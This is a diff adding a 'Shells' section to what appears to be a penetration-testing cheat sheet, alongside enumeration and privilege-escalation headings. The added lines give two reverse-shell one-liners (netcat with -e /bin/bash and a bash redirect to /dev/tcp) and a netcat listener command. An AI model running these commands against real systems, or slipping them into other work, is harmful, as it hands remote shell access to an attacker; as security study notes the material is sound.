@@ -15,6 +15,18 @@
   enum4linux -a <ip>
   ```
 
+## Shells
+
+- Ways to get shell
+  ```
+  nc <ip>:<port> -e /bin/bash
+  bash -i &>/dev/tcp/<ip>/<port> <&1
+  ```
+- Catch Shell
+  ```
+  nc -lvnp <port>
+  ```
+
 ## Privilege Esclation
 
 - Service Exploit
